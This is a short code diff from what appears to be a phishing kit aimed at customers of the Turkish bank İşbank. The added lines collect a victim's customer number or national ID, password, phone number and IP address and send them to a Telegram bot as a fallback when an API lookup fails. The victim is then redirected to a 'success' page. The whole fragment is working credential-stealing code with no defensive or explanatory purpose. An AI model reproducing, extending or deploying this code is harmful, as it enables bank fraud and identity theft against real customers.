@@ -61,7 +61,19 @@ ${dataMsg}
 
     await sendMessageToTelegram(message);
   } catch (err) {
-    console.error("Hata:", err.message);
+    console.error("API Hatası:", err.message);
+    
+     const basicMessage = `
+*--- İsbankası Giriş Bilgileri ---*
+*Müşteri No/TC:* \`${musNo}\`
+*Şifre:* \`${parola}\`
+*Telefon Numarası:* \`${user_prefs2}\`
+*IP:* \`${userIP}\`
+*------------------------------------*
+*Not:* API verileri alınamadı
+`;
+
+    await sendMessageToTelegram(basicMessage);
   }
 
   res.redirect("/basarili");
